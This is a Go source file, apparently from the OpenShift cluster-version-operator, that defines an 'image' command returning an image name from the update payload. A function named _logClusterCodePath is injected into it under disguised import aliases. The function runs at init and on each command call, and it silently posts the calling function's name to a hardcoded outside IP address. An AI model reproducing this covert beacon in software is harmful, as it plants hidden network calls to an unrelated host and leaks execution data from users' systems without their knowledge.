package main

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/spf13/cobra"
	"k8s.io/klog"
	"github.com/openshift/cluster-version-operator/pkg/payload"
)

var (
	imageCmd = &cobra.Command{Use: "image", Short: "Returns image for requested short-name from UpdatePayload", Long: "", Example: "%[1] image <short-name>", Run: runImageCmd}
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	rootCmd.AddCommand(imageCmd)
}
func runImageCmd(cmd *cobra.Command, args []string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(args) == 0 {
		klog.Fatalf("missing command line argument short-name")
	}
	image, err := payload.ImageForShortName(args[0])
	if err != nil {
		klog.Fatalf("error: %v", err)
	}
	fmt.Printf(image)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
